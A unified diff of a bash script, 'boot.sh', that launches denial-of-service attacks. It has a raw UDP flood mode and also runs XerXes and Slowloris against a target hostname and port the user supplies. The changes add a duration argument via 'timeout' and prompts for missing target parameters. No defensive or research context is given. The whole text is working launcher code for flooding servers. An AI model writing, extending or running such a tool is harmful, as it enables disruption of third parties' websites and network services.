@@ -42,8 +42,8 @@ echo ""
 echo -e "${IGreen}Welcome to Boot.sh;"
 echo ""
 echo -e "Usage Raw UDP: ${Red}./boot.sh rawudp [ip] [port] [time] [size]${IGreen}"
-echo -e "Usage XerXes: ${Red}./boot.sh xerxes [hostname] [port]${IGreen}"
-echo -e "Usage Slowloris: ${Red}./boot.sh slowloris [hostname] [port] [https or http]${Color_Off}"
+echo -e "Usage XerXes: ${Red}./boot.sh xerxes [hostname] [port] [time]${IGreen}"
+echo -e "Usage Slowloris: ${Red}./boot.sh slowloris [hostname] [port] [time] [https or http]${Color_Off}"
 echo ""
 if [ -z $1 ]
 	then
@@ -53,18 +53,22 @@ if [ $1 == 'rawudp' ]
 	then
 		if [ -z $2 ]
 			then
+				echo "set target, port, time and size"
 				exit
 		fi
 		if [ -z $3 ]
 			then
+				echo "set port, time and size"
 				exit
 		fi
 		if [ -z $4 ]
 			then
+				echo "set time and size"
 				exit
 		fi
 		if [ -z $5 ]
 			then
+				echo "set size"
 				exit
 		fi
 		echo ""
@@ -75,37 +79,52 @@ if [ $1 == 'xerxes' ]
 	then
 		if [ -z $2 ]
 			then
+				echo "set target, port and time"
 				exit
 		fi
 		if [ -z $3 ]
 			then
+				echo "set port and time"
+				exit
+		fi
+		if [ -z $4 ]
+			then
+				echo "set time"
 				exit
 		fi
 		echo ""
 		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
-		./x $2 $3
+		timeout $4 ./x $2 $3
 fi
 if [ $1 == 'slowloris' ]
 	then
 		if [ -z $2 ]
 			then
+				echo "set target, port, time and method [http/https]"
 				exit
 		fi
 		if [ -z $3 ]
 			then
+				echo "set port, time and method [http/https]"
 				exit
 		fi
 		if [ -z $4 ]
 			then
+				echo "set time and method [http/https"
+				exit
+		fi
+		if [ -z $5 ]
+			then
+				echo "set method [http/https]"
 				exit
 		fi
 		echo ""
 		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
-		if [ $4 == 'https' ]
+		if [ $5 == 'https' ]
 			then
-				perl s -dns $2 -port $3 -https
+				timeout $4 perl s -dns $2 -port $3 -https
 		else
-			perl s -dns $2 -port $3
+			timeout $4 perl s -dns $2 -port $3
 		fi
 fi
 exit
